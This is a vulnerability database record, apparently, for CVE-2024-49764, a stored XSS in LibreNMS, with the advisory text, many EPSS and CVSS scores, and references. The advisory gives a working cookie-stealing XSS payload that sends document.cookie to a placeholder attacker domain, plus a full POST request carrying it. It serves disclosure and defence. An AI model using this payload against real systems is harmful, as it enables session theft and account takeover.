vulnerability_id: VCID-rn5e-fysz-hba5
aliases:
  - CVE-2024-49764
  - GHSA-rmr4-x6c9-jc68
summary: |
  LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/device/capture.inc.php
  ### Summary
  A Stored Cross-Site Scripting (XSS) vulnerability in the "Capture Debug Information" page allows authenticated users to inject arbitrary JavaScript through the "hostname" parameter when creating a new device. This vulnerability results in the execution of malicious code when the "Capture Debug Information" page is visited, redirecting the user and sending non-httponly cookies to an attacker-controlled domain.

  ### Details
  When creating a new device, an attacker can inject the following XSS payload into the "hostname" parameter:

  ```
  test'" autofocus onfocus="document.location='https://<attacker_domain>/logger.php?c='+document.cookie"
  ```

  (Note: You may need to URL-encode the '+' sign in the payload.)

  The payload triggers automatically when visiting the "Capture Debug Information" page for the device, redirecting the user's browser to the attacker-controlled domain along with any non-httponly cookies.

  The vulnerability is due to insufficient sanitization of the "url" variable before it is output in the HTML. This is evident in the following lines of code:

  https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/capture.inc.php#L55

  ### PoC
  1. Create a new device with the following payload in the "hostname" parameter:
  ```
  test'" autofocus onfocus="document.location='https://<attacker_domain>/logger.php?c='+document.cookie"
  ```
  2. Save the device.
  3. Navigate to the "Capture Debug Information" page for the device.
  4. Observe that the injected script triggers and redirects the user to the attacker's domain, sending cookies.

  Example Request:
  ```http
  POST /addhost HTTP/1.1
  Host: <your_host>
  Content-Type: application/x-www-form-urlencoded
  Cookie: <your_cookie>

  _token=<your_token>&hostname=test%27%22+autofocus+onfocus%3D%22document.location%3D%27https%3A%2F%2F<attacker_domain>%2Flogger.php%3Fc%3D%27%2bdocument.cookie%22&snmp=on&sysName=&hardware=&os=&os_id=&snmpver=v2c&port=&transport=udp&port_assoc_mode=ifIndex&community=&authlevel=noAuthNoPriv&authname=&authpass=&authalgo=SHA&cryptopass=&cryptoalgo=AES&force_add=on&Submit=
  ```

  ### Impact

  This vulnerability allows authenticated users to execute arbitrary JavaScript in the context of other users' sessions when they visit the "Capture Debug Information" page of the device. The attacker can redirect the user to a malicious domain and capture non-httponly cookies, potentially compromising the user's account and allowing unauthorized actions.
severities:
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.0055'
    published_at: '2025-04-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00538'
    published_at: '2025-04-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00543'
    published_at: '2025-04-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00547'
    published_at: '2025-04-09 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00554'
    published_at: '2025-04-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00553'
    published_at: '2025-04-12 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00551'
    published_at: '2025-04-10 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00545'
    published_at: '2025-04-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.0054'
    published_at: '2025-04-07 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00536'
    published_at: '2025-04-06 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.0001'
    scoring_system: epss
    scoring_elements: '0.00531'
    published_at: '2025-04-04 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.00011'
    scoring_system: epss
    scoring_elements: '0.00704'
    published_at: '2025-04-14 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10278'
    published_at: '2024-11-20 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10184'
    published_at: '2024-11-18 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.16010'
    published_at: '2024-12-15 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15934'
    published_at: '2025-01-16 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15421'
    published_at: '2024-11-21 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15638'
    published_at: '2024-12-27 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15486'
    published_at: '2024-11-23 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15477'
    published_at: '2024-11-24 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15487'
    published_at: '2024-11-26 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15531'
    published_at: '2024-11-28 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15605'
    published_at: '2024-12-19 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15865'
    published_at: '2024-12-11 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15917'
    published_at: '2024-12-13 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15610'
    published_at: '2024-12-17 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: 6e-05
    scoring_system: epss
    scoring_elements: '0.00307'
    published_at: '2025-04-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: 6e-05
    scoring_system: epss
    scoring_elements: '0.00308'
    published_at: '2025-04-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: 6e-05
    scoring_system: epss
    scoring_elements: '0.00309'
    published_at: '2025-04-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: 6e-05
    scoring_system: epss
    scoring_elements: '0.0031'
    published_at: '2025-04-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: 9e-05
    scoring_system: epss
    scoring_elements: '0.00643'
    published_at: '2025-04-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: 9e-05
    scoring_system: epss
    scoring_elements: '0.00316'
    published_at: '2025-03-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: 9e-05
    scoring_system: epss
    scoring_elements: '0.00641'
    published_at: '2025-04-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: 9e-05
    scoring_system: epss
    scoring_elements: '0.00648'
    published_at: '2025-04-27 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-rmr4-x6c9-jc68
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://github.com/librenms/librenms
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/librenms/librenms
  - score: '4.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
    published_at: None
    url: https://github.com/librenms/librenms/commit/af15eabbb1752985d36f337cecf137a947e170f6
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://github.com/librenms/librenms/commit/af15eabbb1752985d36f337cecf137a947e170f6
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/librenms/librenms/commit/af15eabbb1752985d36f337cecf137a947e170f6
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2024-11-15T16:47:58Z/
    published_at: None
    url: https://github.com/librenms/librenms/commit/af15eabbb1752985d36f337cecf137a947e170f6
  - score: '4.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
    published_at: None
    url: https://github.com/librenms/librenms/security/advisories/GHSA-rmr4-x6c9-jc68
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://github.com/librenms/librenms/security/advisories/GHSA-rmr4-x6c9-jc68
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/librenms/librenms/security/advisories/GHSA-rmr4-x6c9-jc68
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/librenms/librenms/security/advisories/GHSA-rmr4-x6c9-jc68
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2024-11-15T16:47:58Z/
    published_at: None
    url: https://github.com/librenms/librenms/security/advisories/GHSA-rmr4-x6c9-jc68
  - score: '5.4'
    scoring_system: cvssv3
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-49764
  - score: '5.4'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-49764
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-49764
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-49764
weaknesses:
  - CWE-79
  - CWE-937
  - CWE-1035
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-49764
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/commit/af15eabbb1752985d36f337cecf137a947e170f6
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/security/advisories/GHSA-rmr4-x6c9-jc68
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-49764
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:librenms:librenms:*:*:*:*:*:*:*:*
    reference_type:
    reference_id: cpe:2.3:a:librenms:librenms:*:*:*:*:*:*:*:*
  - url: https://github.com/advisories/GHSA-rmr4-x6c9-jc68
    reference_type:
    reference_id: GHSA-rmr4-x6c9-jc68
